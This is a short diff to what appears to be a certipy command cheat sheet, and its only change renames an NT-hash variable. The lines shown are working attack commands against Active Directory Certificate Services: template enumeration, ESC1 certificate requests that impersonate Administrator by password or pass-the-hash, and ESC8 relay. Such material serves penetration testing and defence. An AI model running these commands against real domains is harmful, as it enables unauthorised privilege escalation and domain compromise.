@@ -1,4 +1,4 @@
 certipy find -enabled -u "$USER@$DOMAIN" -p "$PASSWORD" -old-bloodhound
 certipy req -username "$USER@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" -target "$CA_FQDN" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
-certipy req -username "$USER@$DOMAIN" -hashes "$USER_NTHASH" -ca "$CA_NAME" -target "$CA_FQDN" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
+certipy req -username "$USER@$DOMAIN" -hashes "$NT_HASH" -ca "$CA_NAME" -target "$CA_FQDN" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
 certipy relay -ca "$CA_FQDN" -template "$ESC8_TEMPLATE_NAME"
